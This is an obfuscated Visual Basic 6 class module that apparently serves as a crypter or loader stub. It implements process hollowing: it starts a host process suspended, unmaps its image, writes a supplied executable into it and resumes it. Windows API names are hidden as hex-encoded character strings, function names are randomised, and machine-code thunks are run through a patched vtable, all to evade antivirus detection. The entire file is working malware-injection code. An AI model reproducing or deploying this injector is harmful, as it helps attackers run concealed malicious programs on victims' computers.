VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Class1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False

Option Explicit

Private Const IMAGE_DOS_SIGNATURE       As Long = &H5A4D&
Private Const IMAGE_NT_SIGNATURE        As Long = &H4550&

Private Const SIZE_DOS_HEADER           As Long = &H40
Private Const SIZE_NT_HEADERS           As Long = &HF8
Private Const SIZE_EXPORT_DIRECTORY     As Long = &H28
Private Const SIZE_IMAGE_SECTION_HEADER As Long = &H28

Private Const THUNK_APICALL             As String = "8B4C240851<UECWKCBKAA>E8<LVACRKQAXR>5989016631C0C3"
Private Const THUNK_KERNELBASE          As String = "8B5C240854B830000000648B008B400C8B401C8B008B400889035C31C0C3"

Private Const UECWKCBKAA                    As String = "<UECWKCBKAA>"
Private Const LVACRKQAXR                    As String = "<LVACRKQAXR>"

Private Const CONTEXT_FULL              As Long = &H10007
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40

Private Type STARTUPINFO
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type CONTEXT
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As FLOATING_SAVE_AREA
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress              As Long
    Size                        As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature                   As Long
    FileHeader                  As IMAGE_FILE_HEADER
    OptionalHeader              As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_EXPORT_DIRECTORY
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type

Private Type IMAGE_SECTION_HEADER
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtualAddress              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type

Private Declare Sub CopyBytes Lib "MSVBVM60.DLL" Alias "__vbaCopyBytes" (ByVal Size As Long, Dest As Any, Source As Any)

Private c_lKrnl         As Long
Private c_lLoadLib      As Long
Private c_bInit         As Boolean
Private c_lVTE          As Long
Private c_lOldVTE       As Long
Private c_bvASM(&HFF)   As Byte
       
Public Function avu8wctg2pljj26lpxnotpb5jp2y03kqvhtlmggeflnd0a9qvm() As Long
    'This function will be replaced with machine code laterz
    'Do not add any public procedure on top of it
End Function

Public Function nvgx1qc0emtn1rsss3505b2vhqcepsbf75jfeu7015eplu3g9n(ByRef bvBuff() As Byte, Optional sHost As String, Optional ByRef hProc As Long) As Boolean
    Dim i                       As Long
    Dim tIMAGE_DOS_HEADER       As IMAGE_DOS_HEADER
    Dim tIMAGE_NT_HEADERS       As IMAGE_NT_HEADERS
    Dim tIMAGE_SECTION_HEADER   As IMAGE_SECTION_HEADER
    Dim tSTARTUPINFO            As STARTUPINFO
    Dim tPROCESS_INFORMATION    As PROCESS_INFORMATION
    Dim tCONTEXT                As CONTEXT
    Dim lKernel                 As Long
    Dim lNTDll                  As Long
    Dim lMod                    As Long
   
    If Not c_bInit Then Exit Function

    Call CopyBytes(SIZE_DOS_HEADER, tIMAGE_DOS_HEADER, bvBuff(0))
   
    If Not tIMAGE_DOS_HEADER.e_magic = IMAGE_DOS_SIGNATURE Then
        Exit Function
    End If

    Call CopyBytes(SIZE_NT_HEADERS, tIMAGE_NT_HEADERS, bvBuff(tIMAGE_DOS_HEADER.e_lfanew))
   
    If Not tIMAGE_NT_HEADERS.Signature = IMAGE_NT_SIGNATURE Then
        Exit Function
    End If
   
                                   
    lKernel = y9btrf3pvz28b4m1iuliy4lp6hkhx2o0plajfvh7ahfc2e0dji(v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(54) & Chr$(66) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(69) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(67) & Chr$(51) & Chr$(51) & Chr$(51) & Chr$(50)))                                                                                                'KPC
                                    
    lNTDll = y9btrf3pvz28b4m1iuliy4lp6hkhx2o0plajfvh7ahfc2e0dji(v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(54) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(52) & Chr$(54) & Chr$(67) & Chr$(54) & Chr$(67)))                                                                                                    'KPC
   
    If sHost = vbNullString Then
        sHost = Space(260)
                                                
        lMod = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(lKernel, v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(52) & Chr$(55) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(52) & Chr$(52) & Chr$(68) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(52) & Chr$(55) & Chr$(53) & Chr$(54) & Chr$(67) & Chr$(54) & Chr$(53) & Chr$(52) & Chr$(54) & Chr$(54) & Chr$(57) & Chr$(54) & Chr$(67) & Chr$(54) & Chr$(53) & Chr$(52) & Chr$(69) & Chr$(54) & Chr$(49) & Chr$(54) & Chr$(68) & Chr$(54) & Chr$(53) & Chr$(53) & Chr$(55)))                                                                         'KPC
        a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 lMod, App.hInstance, StrPtr(sHost), 260
    End If
   
    With tIMAGE_NT_HEADERS.OptionalHeader
       
        tSTARTUPINFO.cb = Len(tSTARTUPINFO)
           
                                                
        lMod = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(lKernel, v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(52) & Chr$(51) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(49) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(53) & Chr$(53) & Chr$(48) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(51) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(51) & Chr$(55) & Chr$(51) & Chr$(53) & Chr$(55)))                                                                             'KPC
        a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 lMod, 0, StrPtr(sHost), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(tSTARTUPINFO), VarPtr(tPROCESS_INFORMATION)

                                                
        lMod = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(lNTDll, v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(53) & Chr$(54) & Chr$(69) & Chr$(54) & Chr$(68) & Chr$(54) & Chr$(49) & Chr$(55) & Chr$(48) & Chr$(53) & Chr$(54) & Chr$(54) & Chr$(57) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(55) & Chr$(52) & Chr$(70) & Chr$(54) & Chr$(54) & Chr$(53) & Chr$(51) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(51) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(57) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(69)))                                                                        'KPC
        a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 lMod, tPROCESS_INFORMATION.hProcess, .ImageBase
       
                                              
        lMod = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(lKernel, v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(53) & Chr$(54) & Chr$(54) & Chr$(57) & Chr$(55) & Chr$(50) & Chr$(55) & Chr$(52) & Chr$(55) & Chr$(53) & Chr$(54) & Chr$(49) & Chr$(54) & Chr$(67) & Chr$(52) & Chr$(49) & Chr$(54) & Chr$(67) & Chr$(54) & Chr$(67) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(51) & Chr$(52) & Chr$(53) & Chr$(55) & Chr$(56)))                                                                             'KPC
        a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, .SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
       
        lMod = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(lNTDll, v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(55) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(57) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(53) & Chr$(53) & Chr$(54) & Chr$(54) & Chr$(57) & Chr$(55) & Chr$(50) & Chr$(55) & Chr$(52) & Chr$(55) & Chr$(53) & Chr$(54) & Chr$(49) & Chr$(54) & Chr$(67) & Chr$(52) & Chr$(68) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(68) & Chr$(54) & Chr$(70) & Chr$(55) & Chr$(50) & Chr$(55) & Chr$(57)))                                                                        'KPC
        a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, VarPtr(bvBuff(0)), .SizeOfHeaders, 0
   
        For i = 0 To tIMAGE_NT_HEADERS.FileHeader.NumberOfSections - 1
            CopyBytes Len(tIMAGE_SECTION_HEADER), tIMAGE_SECTION_HEADER, bvBuff(tIMAGE_DOS_HEADER.e_lfanew + SIZE_NT_HEADERS + SIZE_IMAGE_SECTION_HEADER * i)
            a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 lMod, tPROCESS_INFORMATION.hProcess, .ImageBase + tIMAGE_SECTION_HEADER.VirtualAddress, VarPtr(bvBuff(tIMAGE_SECTION_HEADER.PointerToRawData)), tIMAGE_SECTION_HEADER.SizeOfRawData, 0
        Next i

        tCONTEXT.ContextFlags = CONTEXT_FULL
       
                                                
        lMod = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(lNTDll, v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(52) & Chr$(55) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(52) & Chr$(52) & Chr$(51) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(56) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(52) & Chr$(54) & Chr$(56) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(49) & Chr$(54) & Chr$(52)))                                                                          'KPC
        a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
   
                                              
        lMod = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(lNTDll, v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(55) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(57) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(53) & Chr$(53) & Chr$(54) & Chr$(54) & Chr$(57) & Chr$(55) & Chr$(50) & Chr$(55) & Chr$(52) & Chr$(55) & Chr$(53) & Chr$(54) & Chr$(49) & Chr$(54) & Chr$(67) & Chr$(52) & Chr$(68) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(68) & Chr$(54) & Chr$(70) & Chr$(55) & Chr$(50) & Chr$(55) & Chr$(57)))                                                                        'KPC
        a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 lMod, tPROCESS_INFORMATION.hProcess, tCONTEXT.Ebx + 8, VarPtr(.ImageBase), 4, 0
       
        tCONTEXT.Eax = .ImageBase + .AddressOfEntryPoint
       
                                                
        lMod = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(lNTDll, v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(51) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(52) & Chr$(52) & Chr$(51) & Chr$(54) & Chr$(70) & Chr$(54) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(56) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(52) & Chr$(54) & Chr$(56) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(49) & Chr$(54) & Chr$(52)))                                                                          'KPC
        a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
       
                                                
        lMod = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(lNTDll, v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(Chr$(52) & Chr$(69) & Chr$(55) & Chr$(52) & Chr$(53) & Chr$(50) & Chr$(54) & Chr$(53) & Chr$(55) & Chr$(51) & Chr$(55) & Chr$(53) & Chr$(54) & Chr$(68) & Chr$(54) & Chr$(53) & Chr$(53) & Chr$(52) & Chr$(54) & Chr$(56) & Chr$(55) & Chr$(50) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(49) & Chr$(54) & Chr$(52)))                                                                              'KPC
        a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 lMod, tPROCESS_INFORMATION.hThread, 0
       
        hProc = tPROCESS_INFORMATION.hProcess
    End With
   
    nvgx1qc0emtn1rsss3505b2vhqcepsbf75jfeu7015eplu3g9n = True
End Function

Public Function a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4(ByVal lMod As Long, ParamArray Params()) As Long
    Dim FET43        As Long
    Dim D3F           As Long
    Dim EGEY       As String
    Dim G3H45     As String
   
    If lMod = 0 Then Exit Function
   
    For D3F = UBound(Params) To 0 Step -1
        G3H45 = G3H45 & Chr$(54) & Chr$(56) & kopjntebrbsrvzzr9x0y64d72xfhujr0iv4kv83up2wq4xcayw(CLng(Params(D3F)))
    Next
   
    FET43 = VarPtr(c_bvASM(0))
    FET43 = FET43 + (UBound(Params) + 2) * 5
    FET43 = lMod - FET43 - 5
   
    EGEY = THUNK_APICALL
    EGEY = Replace(EGEY, UECWKCBKAA, G3H45)
    EGEY = Replace(EGEY, LVACRKQAXR, kopjntebrbsrvzzr9x0y64d72xfhujr0iv4kv83up2wq4xcayw(FET43))
   
    Call PutThunk(EGEY)
   
    a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4 = coys1324j9dnit0ck9fqueaipj4pmgkwisso3r9hh12njqpij2
End Function

Private Function kopjntebrbsrvzzr9x0y64d72xfhujr0iv4kv83up2wq4xcayw(ByVal lData As Long) As String
    Dim bvTemp(3)   As Byte
    Dim i           As Long
   
    CopyBytes &H4, bvTemp(0), lData
    For i = 0 To 3
        kopjntebrbsrvzzr9x0y64d72xfhujr0iv4kv83up2wq4xcayw = kopjntebrbsrvzzr9x0y64d72xfhujr0iv4kv83up2wq4xcayw & Right(Chr$(48) & Hex(bvTemp(i)), 2)
    Next
End Function

Private Sub PutThunk(ByVal sThunk As String)
    Dim i   As Long
    For i = 0 To Len(sThunk) - 1 Step 2
        c_bvASM((i / 2)) = CByte(Chr$(38) & Chr$(104) & Mid$(sThunk, i + 1, 2))
    Next i
End Sub

Private Function coys1324j9dnit0ck9fqueaipj4pmgkwisso3r9hh12njqpij2() As Long
    CopyBytes &H4, c_lVTE, ByVal ObjPtr(Me)
    c_lVTE = c_lVTE + &H1C
    CopyBytes &H4, c_lOldVTE, ByVal c_lVTE
    CopyBytes &H4, ByVal c_lVTE, VarPtr(c_bvASM(0))
    coys1324j9dnit0ck9fqueaipj4pmgkwisso3r9hh12njqpij2 = avu8wctg2pljj26lpxnotpb5jp2y03kqvhtlmggeflnd0a9qvm
    CopyBytes &H4, ByVal c_lVTE, c_lOldVTE
End Function

Public Function j8anuvmuw38t3gl7owt6273iv2lsshzi4alz2o85we3lt4y7em(ByVal sLib As String, ByVal sProc As String) As Long
    j8anuvmuw38t3gl7owt6273iv2lsshzi4alz2o85we3lt4y7em = Me.je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(Me.y9btrf3pvz28b4m1iuliy4lp6hkhx2o0plajfvh7ahfc2e0dji(sLib), sProc)
End Function

Public Function y9btrf3pvz28b4m1iuliy4lp6hkhx2o0plajfvh7ahfc2e0dji(ByVal sLib As String) As Long
    y9btrf3pvz28b4m1iuliy4lp6hkhx2o0plajfvh7ahfc2e0dji = a95ldcmolh93x6f8nxg56x8zh09v358qkrao5y8kvp5nl12mn4(c_lLoadLib, StrPtr(sLib & vbNullChar))
End Function

Public Property Get Initialized() As Boolean
    Initialized = c_bInit
End Property

Public Sub Class_Initialize()

    Call PutThunk(THUNK_KERNELBASE)
   
    c_lKrnl = coys1324j9dnit0ck9fqueaipj4pmgkwisso3r9hh12njqpij2
   
    If Not c_lKrnl = 0 Then
        c_lLoadLib = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(c_lKrnl, Chr$(76) & Chr$(111) & Chr$(97) & Chr$(100) & Chr$(76) & Chr$(105) & Chr$(98) & Chr$(114) & Chr$(97) & Chr$(114) & Chr$(121) & Chr$(87))
        If Not c_lLoadLib = 0 Then
            c_bInit = True
        End If
    End If
End Sub

Public Function je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(ByVal lMod As Long, ByVal sProc As String) As Long
    Dim tIMAGE_DOS_HEADER       As IMAGE_DOS_HEADER
    Dim tIMAGE_NT_HEADERS       As IMAGE_NT_HEADERS
    Dim tIMAGE_EXPORT_DIRECTORY As IMAGE_EXPORT_DIRECTORY
   
    Call CopyBytes(SIZE_DOS_HEADER, tIMAGE_DOS_HEADER, ByVal lMod)
   
    If Not tIMAGE_DOS_HEADER.e_magic = IMAGE_DOS_SIGNATURE Then
        Exit Function
    End If

    Call CopyBytes(SIZE_NT_HEADERS, tIMAGE_NT_HEADERS, ByVal lMod + tIMAGE_DOS_HEADER.e_lfanew)
   
    If Not tIMAGE_NT_HEADERS.Signature = IMAGE_NT_SIGNATURE Then
        Exit Function
    End If
   
    Dim lVAddress   As Long
    Dim lVSize      As Long
    Dim lBase       As Long
   
    With tIMAGE_NT_HEADERS.OptionalHeader
        lVAddress = lMod + .DataDirectory(0).VirtualAddress
        lVSize = lVAddress + .DataDirectory(0).Size
        lBase = .ImageBase
    End With
   
    Call CopyBytes(SIZE_EXPORT_DIRECTORY, tIMAGE_EXPORT_DIRECTORY, ByVal lVAddress)
       
    Dim i           As Long
    Dim lFunctAdd   As Long
    Dim lNameAdd    As Long
    Dim lNumbAdd    As Long

    With tIMAGE_EXPORT_DIRECTORY
        For i = 0 To .NumberOfNames - 1
           
            CopyBytes 4, lNameAdd, ByVal lBase + .lpAddressOfNames + i * 4
           
            If a4x240goslhx0t9hjisdg40lajahv6pu1dkywa9y61wkoibx8j(lBase + lNameAdd) = sProc Then
                CopyBytes 2, lNumbAdd, ByVal lBase + .lpAddressOfNameOrdinals + i * 2
                CopyBytes 4, lFunctAdd, ByVal lBase + .lpAddressOfFunctions + lNumbAdd * 4
               
                je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt = lFunctAdd + lBase
                             
                If je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt >= lVAddress And _
                   je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt <= lVSize Then
                    Call ww9ooiphmp9scxi8gryge15iu5o7yvis77ub9a1l950s62p9mi(je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt, lMod, sProc)
                    If Not lMod = 0 Then
                        je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt = je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt(lMod, sProc)
                    Else
                        je0amv1tuv2um7k15xuutj6xz3uchn18wd2qv8l6lauarex3kt = 0
                    End If
                End If
               
                Exit Function
            End If
        Next
    End With
   
End Function

Private Function ww9ooiphmp9scxi8gryge15iu5o7yvis77ub9a1l950s62p9mi( _
       ByVal lAddress As Long, _
       ByRef lLib As Long, _
       ByRef sMod As String)
       
    Dim sForward     As String

    sForward = a4x240goslhx0t9hjisdg40lajahv6pu1dkywa9y61wkoibx8j(lAddress)
    If InStr(1, sForward, Chr$(46)) Then
        lLib = y9btrf3pvz28b4m1iuliy4lp6hkhx2o0plajfvh7ahfc2e0dji(Split(sForward, Chr$(46))(0))
        sMod = Split(sForward, Chr$(46))(1)
    End If
   
End Function

Private Function a4x240goslhx0t9hjisdg40lajahv6pu1dkywa9y61wkoibx8j( _
       ByVal lAddress As Long) As String
       
    Dim bChar       As Byte
   
    Do
        CopyBytes 1, bChar, ByVal lAddress
        lAddress = lAddress + 1
        If bChar = 0 Then Exit Do
        a4x240goslhx0t9hjisdg40lajahv6pu1dkywa9y61wkoibx8j = a4x240goslhx0t9hjisdg40lajahv6pu1dkywa9y61wkoibx8j & Chr$(bChar)
    Loop
   
End Function

Private Function v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy(ByVal sData As String) As String
    Dim i       As Long
    For i = 1 To Len(sData) Step 2
       v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy = v9i26iiq7hvcq2tuerrwq91etpw4rx5rvgbfqsrro0q3iri5fy & Chr$(Val(Chr$(38) & Chr$(72) & Mid$(sData, i, 2)))
    Next i
End Function

Public Function rizc6m31kcdz9qacz67ezxravytv3t8xb13hmf5i79mptq2tjr(ByVal OnvN9MtEry As String) As String
Dim qOHPMMuJzh As String
Dim xE8KVQnQr6 As String
Dim orCPFJ0gUA As Long
For orCPFJ0gUA = 1 To Len(OnvN9MtEry) Step 2
qOHPMMuJzh = Chr$(Val("&H" & Mid$(OnvN9MtEry, orCPFJ0gUA, 2)))
xE8KVQnQr6 = xE8KVQnQr6 & qOHPMMuJzh
Next orCPFJ0gUA
rizc6m31kcdz9qacz67ezxravytv3t8xb13hmf5i79mptq2tjr = xE8KVQnQr6
End Function
